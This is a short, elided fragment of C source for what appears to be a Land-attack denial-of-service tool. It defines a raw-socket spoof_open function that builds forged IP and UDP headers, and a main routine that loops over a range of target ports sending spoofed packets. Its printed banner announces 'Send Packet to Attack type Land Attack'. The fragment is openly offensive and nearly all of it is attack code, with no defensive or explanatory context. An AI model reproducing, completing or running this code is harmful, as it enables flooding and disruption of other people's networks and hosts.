...
unsigned long spoof_open(unsigned long their_ip, unsigned short port) {
	int i, s;
	struct iphdr ih;
	struct udphdr th;
...
main(int argc, char **argv) {
   int i, x, max, floodloop, diff, urip, j;
   ...
   if (diff > -1) 
     {
	     printf("[H[J\n\nSend Packet to Attack type Land Attack.\n");
	     j = 0;
	     srandom((time(0)+i));
	     srcport = getrandom(1, max)+1000;
	     for (x=lowport;x<=highport;x++) 
	       {  
		  spoof_open(/*0xe1e26d0a*/ them, x);
